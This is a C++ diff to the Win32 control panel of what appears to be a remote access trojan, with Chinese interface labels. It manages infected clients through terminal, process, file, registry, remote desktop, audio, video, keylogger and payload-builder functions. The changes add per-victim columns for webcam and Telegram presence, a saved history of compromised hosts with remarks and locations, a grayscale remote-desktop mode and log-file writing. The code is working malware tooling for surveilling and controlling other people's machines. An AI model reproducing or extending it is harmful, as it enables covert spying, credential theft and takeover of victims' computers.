@@ -12,8 +12,11 @@
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
 #endif
-#include <winsock2.h>
+#ifndef _WINSOCKAPI_
+#define _WINSOCKAPI_
+#endif
 #include <windows.h>
+#include <winsock2.h>
 #include <commctrl.h>
 #include <shellapi.h>
 #include <shlobj.h>
@@ -28,7 +31,9 @@
 #include "StringUtils.h"
 #include "MainWindow.h"
 #include "NetworkHelper.h"
+#include "Config.h"
 #include "UI/TerminalDialog.h"
+#include "UI/HistoryDialog.h"
 #include "UI/ProcessDialog.h"
 #include "UI/FileDialog.h"
 #include "UI/DesktopDialog.h"
@@ -91,33 +96,36 @@ void CreateMainToolbar(HWND hWnd) {
         0, 0, 0, 0, hWnd, (HMENU)IDC_TOOLBAR, g_hInstance, NULL);
     SendMessage(g_hToolbar, TB_BUTTONSTRUCTSIZE, (WPARAM)sizeof(TBBUTTON), 0);
     SendMessage(g_hToolbar, TB_SETBITMAPSIZE, 0, MAKELPARAM(32, 32));
-    HIMAGELIST hImageList = ImageList_Create(32, 32, ILC_COLOR32 | ILC_MASK, 13, 1);
+    HIMAGELIST hImageList = ImageList_Create(32, 32, ILC_COLOR32 | ILC_MASK, 14, 1);
     SendMessage(g_hToolbar, TB_SETIMAGELIST, 0, (LPARAM)hImageList);
     
-    int iconIds[] = { 
-        IDI_TERMINAL, IDI_PROCESS, IDI_WINDOW, IDI_DESKTOP, IDI_FILE, 
-        IDI_AUDIO, IDI_VIDEO, IDI_SERVICE, IDI_REGISTRY, IDI_KEYLOGGER, 
-        IDI_SETTINGS, IDI_BUILDER, IDI_HELP 
+    int iconIds[] = {
+        IDI_TERMINAL, IDI_PROCESS, IDI_WINDOW, IDI_DESKTOP, IDI_FILE,
+        IDI_AUDIO, IDI_VIDEO, IDI_SERVICE, IDI_REGISTRY, IDI_KEYLOGGER,
+        IDI_SETTINGS, IDI_HISTORY, IDI_BUILDER, IDI_HELP
     };
-    for (int i = 0; i < 13; i++) {
+
+    const wchar_t* buttonTexts[] = {
+        L"终端", L"进程", L"窗口", L"桌面", L"文件",
+        L"语音", L"视频", L"服务", L"注册表", L"键盘记录",
+        L"设置", L"历史主机", L"生成", L"帮助"
+    };
+    int ids[] = {
+        IDM_TERMINAL, IDM_PROCESS, IDM_WINDOW, IDM_DESKTOP, IDM_FILE,
+        IDM_AUDIO, IDM_VIDEO, IDM_SERVICE, IDM_REGISTRY, IDM_KEYLOGGER,
+        IDM_SETTINGS, IDM_EXTEND_HISTORY, IDM_BUILDER, IDM_HELP
+    };
+
+    for (int i = 0; i < 14; i++) {
         HICON hIcon = (HICON)LoadImageW(g_hInstance, MAKEINTRESOURCEW(iconIds[i]), IMAGE_ICON, 32, 32, LR_DEFAULTCOLOR);
-        ImageList_AddIcon(hImageList, hIcon);
-        DestroyIcon(hIcon);
+        if (hIcon) {
+            ImageList_AddIcon(hImageList, hIcon);
+            DestroyIcon(hIcon);
+        }
     }
-    
-    const wchar_t* buttonTexts[] = { 
-        L"终端", L"进程", L"窗口", L"桌面", L"文件", 
-        L"语音", L"视频", L"服务", L"注册表", L"键盘记录", 
-        L"设置", L"生成", L"帮助" 
-    };
-    int ids[] = { 
-        IDM_TERMINAL, IDM_PROCESS, IDM_WINDOW, IDM_DESKTOP, IDM_FILE, 
-        IDM_AUDIO, IDM_VIDEO, IDM_SERVICE, IDM_REGISTRY, IDM_KEYLOGGER, 
-        IDM_SETTINGS, IDM_BUILDER, IDM_HELP 
-    };
-    
-    TBBUTTON tbButtons[13];
-    for (int i = 0; i < 13; i++) {
+
+    TBBUTTON tbButtons[14];
+    for (int i = 0; i < 14; i++) {
         ZeroMemory(&tbButtons[i], sizeof(TBBUTTON));
         tbButtons[i].iBitmap = i;
         tbButtons[i].idCommand = ids[i];
@@ -125,7 +133,7 @@ void CreateMainToolbar(HWND hWnd) {
         tbButtons[i].fsStyle = BTNS_AUTOSIZE | BTNS_SHOWTEXT;
         tbButtons[i].iString = (INT_PTR)buttonTexts[i];
     }
-    SendMessage(g_hToolbar, TB_ADDBUTTONS, 13, (LPARAM)&tbButtons);
+    SendMessage(g_hToolbar, TB_ADDBUTTONS, 14, (LPARAM)&tbButtons);
     SendMessage(g_hToolbar, TB_AUTOSIZE, 0, 0);
 }
 
@@ -160,7 +168,6 @@ void LoadListData(const std::string& group) {
             std::wstring wComp = Utils::StringHelper::UTF8ToWide(client->info.computerName);
             std::wstring wUserGroup = Utils::StringHelper::UTF8ToWide(client->info.userName) + L"/" + client->info.group;
             std::wstring wOS = Utils::StringHelper::UTF8ToWide(client->info.osVersion);
-            std::wstring wCPU = Utils::StringHelper::UTF8ToWide(client->info.cpuInfo);
             std::wstring wRTT = std::to_wstring(client->info.rtt) + L"ms";
             std::wstring wVer = Utils::StringHelper::UTF8ToWide(client->info.version);
             std::wstring wInst = Utils::StringHelper::UTF8ToWide(client->info.installTime);
@@ -173,14 +180,17 @@ void LoadListData(const std::string& group) {
             ListView_SetItemText(g_hListClients, index, 4, (LPWSTR)wComp.c_str());
             ListView_SetItemText(g_hListClients, index, 5, (LPWSTR)wUserGroup.c_str());
             ListView_SetItemText(g_hListClients, index, 6, (LPWSTR)wOS.c_str());
-            ListView_SetItemText(g_hListClients, index, 7, (LPWSTR)wCPU.c_str());
-            ListView_SetItemText(g_hListClients, index, 8, (LPWSTR)L"Unknown");
-            ListView_SetItemText(g_hListClients, index, 9, (LPWSTR)wRTT.c_str());
-            ListView_SetItemText(g_hListClients, index, 10, (LPWSTR)wVer.c_str());
-            ListView_SetItemText(g_hListClients, index, 11, (LPWSTR)wInst.c_str());
-            ListView_SetItemText(g_hListClients, index, 12, (LPWSTR)wUptime.c_str());
-            ListView_SetItemText(g_hListClients, index, 13, (LPWSTR)wActWin.c_str());
-            ListView_SetItemText(g_hListClients, index, 14, (LPWSTR)client->remark.c_str());
+            ListView_SetItemText(g_hListClients, index, 7, (LPWSTR)wRTT.c_str());
+            ListView_SetItemText(g_hListClients, index, 8, (LPWSTR)wVer.c_str());
+            ListView_SetItemText(g_hListClients, index, 9, (LPWSTR)wInst.c_str());
+            ListView_SetItemText(g_hListClients, index, 10, (LPWSTR)wUptime.c_str());
+            ListView_SetItemText(g_hListClients, index, 11, (LPWSTR)wActWin.c_str());
+            ListView_SetItemText(g_hListClients, index, 12, (LPWSTR)client->remark.c_str());
+
+            std::wstring wCamera = client->info.hasCamera ? L"是" : L"否";
+            std::wstring wTelegram = client->info.hasTelegram ? L"是" : L"否";
+            ListView_SetItemText(g_hListClients, index, 13, (LPWSTR)wCamera.c_str());
+            ListView_SetItemText(g_hListClients, index, 14, (LPWSTR)wTelegram.c_str());
             
             iCount++;
         }
@@ -299,10 +309,11 @@ void RestartMaster(HWND hWnd) {
 void InitListView(HWND hList) {
     const wchar_t* columns[] = { 
         L"IP", L"端口", L"地理位置", L"LAN地址", L"计算机名", 
-        L"用户名/组名", L"操作系统", L"CPU", L"内存", L"RTT", 
-        L"版本", L"上线时间", L"运行时长", L"活动窗口", L"备注" 
+        L"用户名/组名", L"操作系统", L"RTT", L"版本", 
+        L"上线时间", L"运行时长", L"活动窗口", L"备注",
+        L"摄像头", L"TG安装"
     };
-    int widths[] = { 120, 60, 100, 120, 100, 150, 120, 180, 80, 60, 80, 150, 150, 180, 100 };
+    int widths[] = { 120, 60, 100, 120, 100, 150, 120, 60, 80, 150, 150, 180, 100, 60, 60 };
     LVCOLUMNW lvc = { 0 };
     lvc.mask = LVCF_TEXT | LVCF_WIDTH;
     for (int i = 0; i < 15; i++) {
@@ -312,7 +323,44 @@ void InitListView(HWND hList) {
     }
 }
 
-// 从main_gui.cpp提取：添加日志
+static std::wstring GetLogFilePath() {
+    wchar_t dir[MAX_PATH] = { 0 };
+    wcscpy_s(dir, g_Settings.szConfigPath);
+    wchar_t* p = wcsrchr(dir, L'\\');
+    if (p) *(p + 1) = L'\0';
+    std::wstring path = dir;
+    if (path.empty()) path = L".\\";
+    path += L"master.log";
+    return path;
+}
+
+static std::string WideToUtf8(const std::wstring& w) {
+    if (w.empty()) return std::string();
+    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), NULL, 0, NULL, NULL);
+    if (len <= 0) return std::string();
+    std::string out(len, 0);
+    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), (int)w.size(), &out[0], len, NULL, NULL);
+    return out;
+}
+
+static void AppendLogFile(const std::wstring& line) {
+    std::wstring path = GetLogFilePath();
+    std::string utf8 = WideToUtf8(line);
+    if (utf8.empty()) return;
+    SetLastError(0);
+    HANDLE hFile = CreateFileW(path.c_str(), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+    DWORD lastError = GetLastError();
+    if (lastError != ERROR_ALREADY_EXISTS) {
+        DWORD written = 0;
+        unsigned char bom[3] = { 0xEF, 0xBB, 0xBF };
+        WriteFile(hFile, bom, 3, &written, NULL);
+    }
+    DWORD written = 0;
+    WriteFile(hFile, utf8.data(), (DWORD)utf8.size(), &written, NULL);
+    CloseHandle(hFile);
+}
+
 void AddLog(const std::wstring& type, const std::wstring& msg) {
     if (!g_hListLogs) return;
 
@@ -344,6 +392,14 @@ void AddLog(const std::wstring& type, const std::wstring& msg) {
     SendMessageW(g_hListLogs, LVM_SETITEMW, 0, (LPARAM)&lviMsg);
 
     SendMessageW(g_hListLogs, LVM_ENSUREVISIBLE, index, FALSE);
+
+    SYSTEMTIME st;
+    GetLocalTime(&st);
+    wchar_t line[2048];
+    swprintf_s(line, L"[%04d-%02d-%02d %02d:%02d:%02d][%s] %s\r\n",
+        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
+        type.c_str(), msg.c_str());
+    AppendLogFile(line);
 }
 
 // ---------------------------------------------------------
@@ -474,6 +530,7 @@ void HandleCommand(HWND hWnd, int id) {
         }
         break;
     case IDM_DESKTOP:
+    case IDM_CLIENT_DESKTOP_GRAYSCALE:
         {
             std::shared_ptr<Formidable::ConnectedClient> client;
             {
@@ -485,11 +542,11 @@ void HandleCommand(HWND hWnd, int id) {
                     ShowWindow(client->hDesktopDlg, SW_SHOW);
                     SetForegroundWindow(client->hDesktopDlg);
                 } else {
-                    client->hDesktopDlg = UI::DesktopDialog::Show(hWnd, clientId);
+                    bool isGrayscale = (id == IDM_CLIENT_DESKTOP_GRAYSCALE);
+                    client->hDesktopDlg = UI::DesktopDialog::Show(hWnd, clientId, isGrayscale);
                     if (client->hDesktopDlg) ShowWindow(client->hDesktopDlg, SW_SHOW);
                     
-                    AddLog(L"操作", L"打开远程桌面...");
-                    SendModuleToClient(clientId, CMD_LOAD_MODULE, L"Multimedia.dll");
+                    AddLog(L"操作", isGrayscale ? L"打开远程桌面(灰度)..." : L"打开远程桌面...");
                 }
             }
         }
@@ -657,6 +714,25 @@ void HandleCommand(HWND hWnd, int id) {
                     for (auto cid : selectedClients) {
                         if (g_Clients.count(cid)) {
                             g_Clients[cid]->remark = newRemark;
+                            
+                            // 保存到持久化配置
+                            std::wstring computerName = UTF8ToWide(g_Clients[cid]->info.computerName);
+                            std::wstring userName = UTF8ToWide(g_Clients[cid]->info.userName);
+                            std::wstring uniqueKey = computerName + L"_" + userName;
+                            
+                            {
+                                std::lock_guard<std::mutex> lockRem(g_SavedRemarksMutex);
+                                g_SavedRemarks[uniqueKey] = newRemark;
+                            }
+                            
+                            // 更新历史记录中的备注
+                            {
+                                std::lock_guard<std::mutex> lockHist(g_HistoryHostsMutex);
+                                if (g_HistoryHosts.count(uniqueKey)) {
+                                    g_HistoryHosts[uniqueKey].remark = newRemark;
+                                }
+                            }
+
                             // 更新列表视图显示
                             int itemCount = ListView_GetItemCount(g_hListClients);
                             for (int i = 0; i < itemCount; i++) {
@@ -664,12 +740,15 @@ void HandleCommand(HWND hWnd, int id) {
                                 lvi.mask = LVIF_PARAM;
                                 lvi.iItem = i;
                                 if (ListView_GetItem(g_hListClients, &lvi) && lvi.lParam == cid) {
-                                    ListView_SetItemText(g_hListClients, i, 13, (LPWSTR)newRemark.c_str());
+                                    ListView_SetItemText(g_hListClients, i, 12, (LPWSTR)newRemark.c_str());
                                     break;
                                 }
                             }
                         }
                     }
+                    // 统一保存到文件
+                    SaveClientRemarks();
+                    SaveHistoryHosts();
                     AddLog(L"系统", L"已更新 " + std::to_wstring(selectedClients.size()) + L" 个客户端的备注");
                 }
                 break;
@@ -1094,23 +1173,7 @@ void HandleCommand(HWND hWnd, int id) {
         break;
     }
     case IDM_EXTEND_HISTORY: {
-        // 显示历史主机列表
-        std::wstring info = L"历史主机数量: " + std::to_wstring(g_Clients.size()) + L"\n\n";
-        info += L"当前在线主机:\n";
-        
-        std::lock_guard<std::mutex> lock(g_ClientsMutex);
-        int count = 0;
-        for (auto& pair : g_Clients) {
-            if (count++ >= 10) {
-                info += L"...\n";
-                break;
-            }
-            auto& client = pair.second;
-            info += L"• " + UTF8ToWide(client->ip) + L" - " + 
-                    UTF8ToWide(client->info.computerName) + L"\n";
-        }
-        
-        MessageBoxW(hWnd, info.c_str(), L"历史主机", MB_OK | MB_ICONINFORMATION);
+        Formidable::UI::HistoryDialog::Show(hWnd);
         break;
     }
     case IDM_EXTEND_BACKUP: {
@@ -1173,7 +1236,7 @@ void HandleCommand(HWND hWnd, int id) {
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
     switch (message) {
     case WM_CREATE: {
-        CreateMainMenu(hWnd);
+        // CreateMainMenu(hWnd); // 移除主菜单
         CreateMainToolbar(hWnd);
         
         g_hStatusBar = CreateStatusWindowW(WS_CHILD | WS_VISIBLE, L"", hWnd, IDC_STATUSBAR);
@@ -1324,6 +1387,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
                 AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_PROCESS, L"进程管理(&P)");
                 AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_WINDOW, L"窗口管理(&W)");
                 AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_DESKTOP, L"远程桌面(&D)");
+                AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_CLIENT_DESKTOP_GRAYSCALE, L"远程桌面 (灰度)(&G)");
                 AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_FILE, L"文件管理(&F)");
                 AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_SERVICE, L"服务管理(&S)");
                 AppendMenuW(hControlMenu, MF_STRING | (!hasSel ? MF_GRAYED : 0), IDM_REGISTRY, L"注册表(&R)");
@@ -1384,17 +1448,23 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
                     g_SortInfo[hList].ascending = true;
                 }
                 
-                int count = ListView_GetItemCount(hList);
-                for (int i = 0; i < count; i++) {
-                    LVITEMW lvi = { 0 };
-                    lvi.mask = LVIF_PARAM;
-                    lvi.iItem = i;
-                    ListView_GetItem(hList, &lvi);
-                    lvi.lParam = i;
-                    ListView_SetItem(hList, &lvi);
-                }
-                
                 ListView_SortItems(hList, ListViewCompareProc, (LPARAM)&g_SortInfo[hList]);
+                
+                {
+                    std::lock_guard<std::mutex> lock(g_ClientsMutex);
+                    int count = ListView_GetItemCount(hList);
+                    for (int i = 0; i < count; i++) {
+                        LVITEMW lvi = { 0 };
+                        lvi.mask = LVIF_PARAM;
+                        lvi.iItem = i;
+                        if (ListView_GetItem(hList, &lvi)) {
+                            uint32_t cid = (uint32_t)lvi.lParam;
+                            if (g_Clients.count(cid)) {
+                                g_Clients[cid]->listIndex = i;
+                            }
+                        }
+                    }
+                }
             } else if (nm->code == NM_DBLCLK) {
                 LPNMITEMACTIVATE lpnmitem = (LPNMITEMACTIVATE)lParam;
                 if (lpnmitem->iItem != -1) {
@@ -1403,7 +1473,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
                     lvi.iItem = lpnmitem->iItem;
                     if (ListView_GetItem(g_hListClients, &lvi)) {
                         uint32_t clientId = (uint32_t)lvi.lParam;
-                        PostMessage(hWnd, WM_COMMAND, IDM_FILE, (LPARAM)clientId);
+                        PostMessage(hWnd, WM_COMMAND, IDM_DESKTOP, (LPARAM)clientId);
                     }
                 }
             }
@@ -1432,10 +1502,35 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
         struct UpdateData { uint32_t id; std::wstring loc; int index; };
         UpdateData* data = (UpdateData*)lParam;
         if (data) {
-            LVITEMW lvi = { 0 };
-            lvi.iSubItem = 3;
-            lvi.pszText = (LPWSTR)data->loc.c_str();
-            SendMessageW(g_hListClients, LVM_SETITEMTEXTW, data->index, (LPARAM)&lvi);
+            LVFINDINFOW fi = { 0 };
+            fi.flags = LVFI_PARAM;
+            fi.lParam = (LPARAM)data->id;
+            int index = ListView_FindItem(g_hListClients, -1, &fi);
+            if (index >= 0) {
+                LVITEMW lvi = { 0 };
+                lvi.iSubItem = 2;
+                lvi.pszText = (LPWSTR)data->loc.c_str();
+                SendMessageW(g_hListClients, LVM_SETITEMTEXTW, index, (LPARAM)&lvi);
+            }
+
+            {
+                std::shared_ptr<Formidable::ConnectedClient> client;
+                {
+                    std::lock_guard<std::mutex> lock(g_ClientsMutex);
+                    if (g_Clients.count(data->id)) client = g_Clients[data->id];
+                }
+                if (client) {
+                    std::wstring computerName = Utils::StringHelper::UTF8ToWide(client->info.computerName);
+                    std::wstring userName = Utils::StringHelper::UTF8ToWide(client->info.userName);
+                    std::wstring uniqueKey = computerName + L"_" + userName;
+                    if (!uniqueKey.empty()) {
+                        std::lock_guard<std::mutex> lockHist(g_HistoryHostsMutex);
+                        if (g_HistoryHosts.count(uniqueKey)) {
+                            g_HistoryHosts[uniqueKey].location = data->loc;
+                        }
+                    }
+                }
+            }
             delete data;
         }
         break;
@@ -1450,6 +1545,7 @@ LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) 
         if (g_hTermFont) DeleteObject(g_hTermFont);
         if (g_hTermEditBkBrush) DeleteObject(g_hTermEditBkBrush);
         RemoveTrayIcon(hWnd);
+        SaveSettings();
         PostQuitMessage(0);
         break;
     default:
